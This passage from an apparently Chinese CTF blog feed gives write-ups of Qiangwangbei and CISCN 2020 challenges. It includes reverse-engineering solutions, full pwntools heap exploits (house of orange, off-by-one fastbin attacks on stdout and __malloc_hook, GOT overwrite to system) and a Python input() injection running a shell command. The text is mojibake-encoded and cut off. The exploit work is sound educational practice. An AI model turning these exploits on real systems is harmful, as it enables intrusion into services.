id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>house of orangeæ¥è·å–ä¸€ä¸ªunsortbin </li><li>ç”³è¯·ä¸€ä¸ªå †å—ï¼Œä¼šåœ¨è¿™ä¸ªold top chunkä¸­ï¼Œåˆ‡å‡ºä¸€ä¸ªå †å—ï¼Œå…¶ä¸Šä¼šå­˜åœ¨libcçš„ç›¸å…³åœ°å€</li><li>showä¸€ä¸‹ï¼Œæ³„æ¼å‡ºlibc base</li><li>leave <code>__malloc_hook - 0x60</code>çš„åœ°å€åœ¨<code>key</code> å¤„ï¼Œç„¶åè¿›è¡Œç¼–è¾‘è¿™é‡Œçš„æ•°æ®ã€‚</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./Just_a_Galgame&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def edit(idx,data):    sla(&quot;&gt;&gt;&quot;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;name&#39;,str(data))def show():    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)def add():    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)def add100():    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)def leave(buf):    sla(&#39;&gt;&gt;&#39;,&#39;5&#39;)    s(str(buf))add()payload = &#39;\x00&#39;*8 + p64(0xd41)edit(0,payload)add100()add()show()ru(&#39;1: &#39;)libc_base = uu64(r(6)) - 0x3ec2a0info_addr(&#39;libc&#39;,libc_base)leave(p64(libc_base + 0x3ebc30 - 0x60))one_rec = 0x4f3c2 + libc_baseedit(8,p64(one_rec))add()itr()</code></pre><p>è¿˜æ˜¯æŒºç®€å•çš„ï¼Œæ¯”èµ›æ—¶ç«Ÿç„¶æ²¡æœ‰çœ‹è¿™ä¸ªé¢˜ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;a href=&quot;#å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®&quot;&gt;&lt;/a&gt;å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®&lt;/h1&gt;&lt;h2 id=&quot;babymessage&quot;&gt;&lt;a href=&quot;#ba
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>cicsn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®</title>
    <link href="http://chumen77.xyz/2020/08/20/cicsn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/20/cicsn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®/</id>
    <published>2020-08-20T15:03:02.238Z</published>
    <updated>2020-09-09T02:08:02.489Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cicsn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®"><a href="#cicsn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="cicsn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®"></a>cicsn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>ï¿¼<br>çœ‹èµ·æ¥åƒæ˜¯éé½æ¬¡çº¿æ€§æ–¹ç¨‹ï¼Œé‚£å°±æ˜¯å°±æ˜¯ä¸€ä¸ªè§£æ–¹ç¨‹:</p><pre><code class="python">from numpy import *import numpy as npa = np.array([[12, 53, 6,34,58,36,1],            [83,85,12,73,27,96,52],            [78,53,24,36,86,25,46],            [39,78,52,9,62,37,84],            [23,6,14,74,48,12,83],            [27,85,92,42,48,15,72],            [4,6,3,67,0,26,68]])b = np.array([[20247],[40182],[36315],[36518],[26921],[39185],[16546]])result=[]x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[12094],[25270],[19330],[18540],[16386],[21207],[11759]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[10460],[25613],[21135],[24891],[18305],[27415],[12855]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[10899],[24927],[20670],[22926],[18006],[23345],[12602]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[12304],[26622],[19807],[22747],[14233],[24736],[10064]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[14169],[35155],[28962],[33273],[21796],[35185],[14877]])x = np.linalg.solve(a, b)result += x.tolist()flag=&#39;&#39;for i in result:    for f in i:        flag+=chr(int(f+0.5))print(flag)</code></pre><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚</p><pre><code>  Handles = CreateThread(0, 0, StartAddress, 0, 0, 0);  v5 = CreateThread(0, 0, loc_401200, 0, 0, 0);  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0);  WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF);</code></pre><p>è¿™é‡Œå¼€å§‹å¼€å¤šçº¿ç¨‹ã€‚</p><pre><code>void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter){  while ( !IsDebuggerPresent() )    ;  puts((int)&quot;debug!\n&quot;);  exit(0);}</code></pre><p>è¿™é‡Œé¢åˆ†åˆ«æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>è¿˜æœ‰å¯¹ä½ è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸</p><pre><code>402150 key             db 0DDh,5Bh,9Eh,1Dh,20h,9Eh,90h,91h,2 dup(90h),91h.rdata:00402150                                         ; DATA XREF: main1+96â†‘r.rdata:00402150                 db 92h,0DEh,8Bh,11h,0D1h,1Eh,9Eh,8Bh,51h,11h.rdata:00402150                 db 50h,51h,8Bh,9Eh,2 dup(5Dh),11h,8Bh,90h,12h,91h.rdata:00402150                 db 50h,12h,0D2h,91h,92h,1Eh,9Eh,90h,0D2h,9Fh</code></pre><p>è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚</p><p>é‚£ä¹ˆæ€è·¯å°±æ˜¯è¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¼šæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å¼€å§‹æƒ³åŠæ³•å¯»æ‰¾å­—ç¬¦æ˜ å°„æ¥ç¢°æ’flagã€‚</p><pre><code>1 &gt; 0x922 &gt; 0xd23 &gt; 0x124 &gt; 0x515 &gt; 0x916 &gt; 0xd17 &gt; 0x118 &gt; 0x509&gt; 0x900 &gt; 0x52a &gt; 0x9ec &gt; 0x1ed &gt; 0x5d s &gt; 0x22- &gt; 0x8bf &gt; 0xddl &gt; 0x5ba &gt; 0x9eg &gt; 0x1d</code></pre><pre><code>key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90,  0x91, 0x90, 0x90,   0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,   0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,   0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90,   0xD2, 0x9F]</code></pre><p>ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š</p><pre><code>flag{a959951b-76ca-4784-add7-93583251ca92}</code></pre><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚</p><pre><code>  Handles = CreateThread(0, 0, StartAddress, 0, 0, 0);  v5 = CreateThread(0, 0, loc_401200, 0, 0, 0);  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0);  WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF);</code></pre><p>å¼€å§‹æ–°çš„çº¿ç¨‹ï¼š</p><pre><code>void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter){  while ( !IsDebuggerPresent() )    ;  puts((int)&quot;debug!\n&quot;);  exit(0);}</code></pre><p>è¿™æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentï¼Œè¿‡çš„åŠæ³•å¾ˆç®€å•ï¼Œåœ¨x64dbgä¸­åœ¨è¿›å…¥IsDebuggerPresentæ—¶ï¼Œè¾“å…¥dbhï¼Œéšè—è°ƒè¯•å™¨å³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/BPs5Q6.png" srcset="/img/loading.gif" alt></p><p>æµ‹è¯•åœ¨è¿™é‡Œdbhå³å¯ã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>è¿˜æœ‰å¯¹ä½ çš„inputè¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸<br><img src="http://qiqianyun.chumen77.xyz/uPic/vXxpNH.png" srcset="/img/loading.gif" alt></p><p>è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚</p><p>å…ˆè¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼ˆ0x401223ï¼‰ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œçœ‹äº†ä¸€ä¼šå‘ç°æ²¡æœ‰å¦‚æ­¤ç®€å•ï¼Œä½†æ˜¯å‘ç°ä½ è¾“å…¥ç‰¹å®šå­—ç¬¦ï¼Œç»è¿‡ç¨‹åºå¤„ç†å‡ºæ¥çš„éƒ½æ˜¯ä¸€æ ·çš„:</p><p>éšæ„è¾“å…¥<code>flag{==2332311111111111111111122222222211}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/vXXqPj.png" srcset="/img/loading.gif" alt></p><p>å¯ä»¥æ‰“å°å­—ç¬¦ä¸ç®—å¤šï¼Œè¿™å°±å¯ä»¥å¯ä»¥å»ºç«‹ä¸€ä¸ªæ˜ å°„è¡¨ï¼š<br>è¾“å…¥<code>flag{1234567890qwertyuiopasdfghjkbnmmmmmm}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/3GOgJx.png" srcset="/img/loading.gif" alt></p><p>å¤„ç†å®Œï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/zsN4o0.png" srcset="/img/loading.gif" alt><br>è·å–æ˜ å°„è¡¨ï¼š</p><pre><code>1 &gt; 0x922 &gt; 0xd23 &gt; 0x124 &gt; 0x515 &gt; 0x916 &gt; 0xd17 &gt; 0x118 &gt; 0x509&gt; 0x900 &gt; 0x52f &gt; 0xddl &gt; 0x5ba &gt; 0x9eg &gt; 0x1da &gt; 0x9ec &gt; 0x1ed &gt; 0x5d s &gt; 0x22- &gt; 0x8b</code></pre><p>æå–ä¸€ä¸‹keyï¼š</p><pre><code>key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90,  0x91, 0x90, 0x90,  0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,   0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,   0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F]</code></pre><p>ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š</p><pre><code>flag{a959951b-76ca-4784-add7-93583251ca92}</code></pre><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>å¯ä»¥ç¡®å®šä¸€ä¸‹idaæ— æ³•è¯†åˆ«çš„æ•°æ®æ®µï¼Œæ˜¯è¢«èŠ±æŒ‡ä»¤å¤„ç†è¿‡äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/yY437o.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå¼€å§‹å¾€ä¸‹è¯†åˆ«å¼‚å¸¸ï¼Œåœ¨åŠ¨æ€è°ƒè¯•åï¼Œæå–ä¸€ä¸‹æ­£ç¡®çš„æ±‡ç¼–ä»£ç ï¼Œæ ¹æ®æ­£ç¡®çš„ç®—æ³•è¿›è¡Œpatchæ‰èŠ±æŒ‡ä»¤ã€‚ï¼ˆè¿˜æ˜¯æ³¨æ„dbhéšè—ä¸€ä¸‹è°ƒè¯•å™¨ã€‚ï¼‰</p><pre><code class="c">void __stdcall __noreturn sub_401120(LPVOID lpThreadParameter){  int v1; // ebx  CreateThread(0, 0, hHandle, 0, 0, 0);  WaitForSingleObject(hHandle, 0xFFFFFFFF);  inputs[0] = (inputs[0] &lt;&lt; 6) ^ ((signed int)(unsigned __int8)inputs[0] &gt;&gt; 2);  inputs[0] ^= 0x23u;  Sleep(6u);  v1 = *(unsigned __int8 *)(__readfsdword(0x30u) + 2);  inputs[0] += 0x23;  JUMPOUT(loc_4011EC);}</code></pre><p>Patch åçš„ï¼Œå‹‰å¼ºå¯ä»¥çœ‹æ‡‚ã€‚å…¶ä¸­è‚¯å®šæ˜¯<code>inputs[i]</code>è¿›è¡Œå¤„ç†çš„ï¼Œå…¶ä¸­ä¹Ÿæœ‰ä¸€ä¸ªåœ°æ–¹åœ¨åŠ 1ã€‚</p><pre><code class="python">key = [    0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90,     0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,     0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,     0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90,     0xD2, 0x9F]flag = &#39;&#39;for i in range(len(key)):    key[i] -= 0x23    key[i] &amp;= 0xff #æœ‰å¯èƒ½è¿ç®—åä¼šå°äº0çš„ï¼Œæ‰€ä»¥ç»™å¤„ç†ä¸€ä¸‹    key[i] ^= 0x23    key[i] = ((key[i] &gt;&gt; 6) ^ (key[i] &lt;&lt; 2)) &amp; 0xff    flag += chr(key[i])print(flag)</code></pre><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>ubuntu 16ï¼Œoff by oneï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œéœ€è¦æ”»å‡»stdoutæ³„æ¼libcåœ°å€ã€‚</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>ç”¨off by oneï¼Œæ„é€ å‡ºchunk overlapping ,å¹¶ä¸”æƒ³åŠæ³•é‡Šæ”¾å †å—ï¼Œè®©<code>main_arena_</code>è½åœ¨fastbinä¸­</li><li>ä¿®æ”¹è¿™ä¸ª<code>main_arena_</code>çš„æœ€å2ä¸ªå­—èŠ‚ï¼Œè®©å…¶æŒ‡å‘<code>stdout</code>é™„è¿‘å¸¦æœ‰<code>0x7f</code>çš„åœ°å€ï¼ˆå±äº0x70çš„fastbinå †å—ï¼‰</li><li>ä½¿ç”¨chunk overlapping ï¼Œæ¥ä¿®æ”¹ç©ºé—²çš„fastbin chainï¼Œä½¿å…¶ä¸­ä¸€ä¸ªæŒ‡å‘è¿™ä¸ªå¸¦æœ‰<code>main_arena</code>çš„å †å—ï¼Œè¿›è¡Œfastbin attackï¼Œä¿®æ”¹åˆ°stdoutå¤„çš„å†…å®¹ï¼Œleak libc</li><li>é‡å¤ä»¥ä¸Šçš„æ­¥éª¤ï¼Œæ„é€ ä¸€ä¸ªå †å—åˆ°<code>malloc_hook</code>å¤„ï¼Œå†™ä¸Šone gadget å³å¯ã€‚</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;101.200.53.148&#39;,34521)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def alloca(idx,size,data):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;idx&#39;,str(idx))    sla(&#39;len&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;&gt;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))# def pwn():def leak_addr():    alloca(0,1,&#39;aa&#39;)    alloca(1,0x4f0,&#39;\xdd\xd5&#39;)    alloca(2,0xb0,&#39;aa&#39;)    alloca(3,0x60,&#39;aa&#39;)    free(0)    alloca(0,0x18,&#39;/bin/sh\x00&#39;*2 + p64(0) + &#39;\xc1&#39;)    free(1)    alloca(1,0x60,&#39;\xdd\xd5&#39;)    alloca(4,0x60,&#39;\x50\x47&#39;)    alloca(5,0x60,&#39;\x50\x47&#39;)    alloca(6,0x60,&#39;\x50\x47&#39;)    alloca(7,0x30,&#39;aa&#39;)    alloca(8,0x160,&#39;aaaaaa&#39;)    alloca(9,0x60,&#39;aa&#39;)    alloca(10,0x30,&#39;aa&#39;)    free(7)    alloca(0,0x38, p64(0) * 7 + &#39;\xe1&#39;)    free(8)    free(4)    free(9)    free(5)    payload = &#39;a&#39; * 0x160    alloca(11,0x180,payload)    payload = &#39;a&#39; * 0x160 + p64(0) + p64(0x71) + &#39;\x20&#39;    alloca(11,0x180,payload)    alloca(12,0x60,&#39; &#39;)    # debug()    alloca(13,0x60,&#39; &#39;)    alloca(14,0x60,&#39;\xed\xca&#39;)    payload = &#39;a&#39; * 3 + p64(0) * 6 + p64(0xfbad3c80)+p64(0)*3+p8(0)    alloca(15,0x60,payload)# leak_addr()leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(10)        leak = uu64(r(6))        if leak == 0x7ff81b57b6a3:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./pwn&#39;)        # io = remote(&#39;101.200.53.148&#39;,34521)        continueinfo_addr(&#39;leak&#39;,leak)libc_base = leak - 0x3c56a3info_addr(&#39;libc_base&#39;,libc_base)rec = 0xf1207 + libc_basedef getshell():    alloca(7,0x60,&#39; &#39;)    alloca(8,0x60,&#39; &#39;)    free(0)    free(11)    free(6)    alloca(5,0x60,&#39; &#39;)    alloca(4,0x60,&#39; &#39;)    alloca(0,0x60,&#39;\xed\xca&#39;)    free(4)    free(13)    free(12)    payload = &#39;a&#39; * 0x80 + p64(0) + p64(0x71) + &#39;\x90&#39;    alloca(13,0x90,payload)    alloca(11,0x60,&#39;\x20\xd0&#39;)    alloca(6,0x60,&#39;\x20\xd0&#39;)    alloca(4,0x60,&#39;\x20\xd0&#39;)    payload = &#39;a&#39; * 3 + p64(0) * 2 + p64(rec)    alloca(5,0x60,payload)    # debug()    sleep(0.1)    # alloca(8,30,&#39;1&#39;)getshell()itr()</code></pre><p>æ·±å¤œå†™çš„expï¼Œä¼°è®¡æ„é€ å †å—çš„æ€è·¯æœ‰ç‚¹æ··ä¹±ã€‚ğŸ¤£ğŸ¤£</p><h3 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h3><p>æ¯”èµ›æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯ä¸ªwebpwnï¼Œä¸æ•¢å»åšã€‚ä½†æ˜¯å¾ˆå¤šé˜Ÿä¼åšå‡ºæ¥äº†ï¼Œè¯•ç€å»åšï¼Œçœ‹åˆ°server.py,ä¸äº†è§£jscï¼Œä»¥ä¸ºåªèƒ½æ‰§è¡Œjsä»£ç ï¼ŒåºŸäº†å¾ˆå¤§ç²¾åŠ›å†™jsæ¥è¯»å–flagï¼Œè¿˜æ˜¯æ²¡æœ‰æˆåŠŸã€‚tclã€‚</p><p>æœ€åçœ‹wpï¼ŒçŸ¥é“äº†inputå‡½æ•°æœ¬èº«å°±æ˜¯ä¸ªæ¼æ´å‡½æ•°ï¼Œå…¶ä¼šå°†stdinè¾“å…¥çš„å†…å®¹å½“åšpythonä»£ç å»æ‰§è¡Œï¼ˆå°±åƒæ‰§è¡Œè®¡ç®—å¼ä¸€æ ·ï¼Œå°†å…¶çœ‹åšpythonä»£ç ï¼Œé€šè¿‡è®¡ç®—è¿”å›ç»“æœï¼‰ã€‚å½“ç„¶å¯ä»¥ç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡éœ€è¦å…ˆå€’å…¥osçš„æ¨¡å—ï¼Œç„¶åæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre><code class="python">__import__(&#39;os&#39;).system(&#39;cat /home/ctf/flag&#39;)</code></pre><p>å¯¹äºpythonï¼Œinputå‡½æ•°æ¼æ´ï¼Œå‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/weixin_34221332/article/details/92713257" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34221332/article/details/92713257</a></p><h3 id="no-free"><a href="#no-free" class="headerlink" title="no free"></a>no free</h3><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><pre><code class="python">*] &#39;/ctf/work/ciscn2020/pwn/nofree/pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>å¯ä»¥çœ‹åˆ°ä¿æŠ¤å¼€çš„è¿˜æ˜¯å¾ˆå°‘çš„ï¼Œç„¶åno free æ˜æ˜¾éœ€è¦ä½¿ç”¨åˆ°hos of orangeè¿›è¡Œæ”»å‡»äº†ã€‚</p><h5 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h5><ul><li>åªèƒ½ç”³è¯·0-0x90å¤§å°çš„å †å—ï¼Œå †å—å·è‡ªå®šä¹‰0-2ï¼Œä¸”ç”±äºæ²¡æœ‰å¯¹å·²ç»å­˜åœ¨çš„å †å—å·éªŒè¯ï¼Œå¯ä»¥è¿›è¡Œæ— é™æ¬¡çš„ç”³è¯·åŒä¸€ä¸ªåºå·çš„å †å—ã€‚</li><li>å †å—åœ°å€å­˜åœ¨äº<code>0x06020C0  + 0x100</code> size è·Ÿåœ¨åé¢ã€‚</li><li><code>strdup</code> ç›¸å½“äº<code>malloc(stren(s))</code> </li></ul><h5 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h5><ul><li>å€˜è‹¥è¾“å…¥æ²¡æœ‰å­˜åœ¨çš„å †å—idxï¼Œç¨‹åºä¼šç›´æ¥è¿”å›</li><li><code>read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]);</code> è¿™é‡Œç”±äºæ˜¯è¿™æ ·çš„åˆ¤æ–­ï¼Œç»“åˆaddçš„<code>strdup</code> å°±é€ æˆäº†å †æº¢å‡ºã€‚</li></ul><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p>éš¾ç‚¹åŸºæœ¬å°±åœ¨æ³„æ¼libcäº†ã€‚</p><ul><li>åˆ©ç”¨ç¨‹åºçš„å †æº¢å‡ºæ¼æ´ï¼Œä¿®æ”¹ä¸€ä¸‹top chunk</li><li>ç”³è¯·å¤šæ¬¡0å·0x90çš„å †å—ï¼Œæ¥æ¶ˆè€—ä¿®æ”¹åçš„top chunkï¼Œåˆ°è¾¾ä¸€å®šç¨‹åº¦åè¿›è¡Œhos of orangeæ”»å‡»ï¼Œè·å–ä¸€ä¸ªç©ºé—²çš„è¿›å…¥fastbinçš„å †å—</li><li>åˆ©ç”¨å †æº¢å‡ºï¼Œåœ¨fastbin chainä¸ŠåŠ ä¸€ä¸ª<code>0x06020C0  + 0x100</code> ï¼Œå‡†å¤‡è¿›è¡Œfastbin attackï¼Œæ¥è·å–ä¸€ä¸ªåœ¨å­˜æ”¾å †å—åœ°å€çš„å †å—ï¼Œè¿™æ ·å°±å®ç°äº†ä»»æ„åœ°å€å†™ã€‚</li><li>ä¿®æ”¹<code>atoi</code> çš„got è¡¨ä¸º printfï¼Œåˆ›é€ å‡ºä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>åˆ©ç”¨addä¸­çš„atoiï¼Œå®Œæˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¿®æ”¹<code>atoi</code> çš„gotè¡¨ä¸º<code>elf.plt[&#39;atoi&#39;] + 6</code> ï¼Œè®©å…¶å®Œæˆä¸€ä¸‹è§£æï¼Œé‡æ–°æ„é€ å‡ºæ­£å¸¸çš„atoiï¼ˆåŸå› ï¼šæµ‹é€Ÿä¸­å‘ç°ï¼Œç”¨editåŠŸèƒ½è¾“å…¥idxåç›´æ¥é€€å‡ºï¼Œåªèƒ½è®©å…¶æ¢å¤æ­£å¸¸ï¼Œå†è¿›è¡Œä»»æ„åœ°å€å†™ï¼‰</li><li>ä¿®æ”¹<code>atoi</code> çš„gotä¸ºsystemçš„åœ°å€ï¼Œç„¶ååœ¨å‘é€ä¸ª<code>sh</code> ï¼Œå®Œæˆ<code>system(sh)</code></li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = 